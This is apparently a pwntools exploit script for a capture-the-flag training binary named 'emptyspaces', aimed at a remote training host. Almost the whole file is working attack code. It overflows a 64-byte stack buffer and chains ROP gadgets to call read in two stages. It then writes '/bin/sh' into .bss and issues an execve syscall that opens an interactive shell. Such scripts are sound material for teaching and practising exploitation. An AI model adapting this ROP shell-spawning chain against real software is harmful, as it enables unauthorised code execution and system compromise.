from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
	#r = process("./emptyspaces") #using gdb.debug start the process with the debugger
	r = gdb.debug('./emptyspaces', """
	c
	""")
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 4006)

#Gadgets
rdxRsiRet = 0x44bd59 # pop rdx ; pop rsi ; ret
rsiRet = 0x410133 # pop rsi ; ret
rdiRet = 0x400696 # pop rdi ; ret
raxRet = 0x4155a4 # pop rax ; ret
rdxRet = 0x4497c5 # pop rdx ; ret
syscallRet = 0x474dc5 # syscall ; ret

#Other variables
read = 0x4497b0
globalVariableBss = 0x6bb2e0 #presa la prima trovata in bss (tanto non è usata nel main)

#Fill the space of the buffer of 64 bytes
payload = b"A"*64
payload += b"A"*8 # overwrite ebp

#Start READ (multistage)
payload += p64(rdiRet)
payload += p64(0x0)

payload += p64(rdxRet)
payload += p64(0x200)

#we don't change buf pointer (rsi) since we write again in out variable buff

payload += p64(read)


r.send(payload)

input("wait")
print("Payload Sent 1!")
#End READ

#Start READ 2
payload = b"B"*64
payload += b"B"*8 # overwrite ebp

payload += b"B"* 40 #overwrite to reach current ip

payload += p64(rdiRet)
payload += p64(0x0)

payload += p64(rdxRsiRet)
payload += p64(0x8)
payload += p64(globalVariableBss)

payload += p64(read)
#End READ 2

#Start EXECVE + send payload
payload += p64(rdxRsiRet)
payload += p64(0)
payload += p64(0)

payload += p64(rdiRet)
payload += p64(globalVariableBss)

payload += p64(raxRet)
payload += p64(0x3b)

payload += p64(syscallRet)

r.send(payload)

input("wait")
print("Payload Sent 2!") #We wrote all our malicious payload

#End EXECVE + send payload
r.send(b"/bin/sh\x00") #here we send binsh

input("wait")
print("Binsh sent to global variable")

r.interactive()

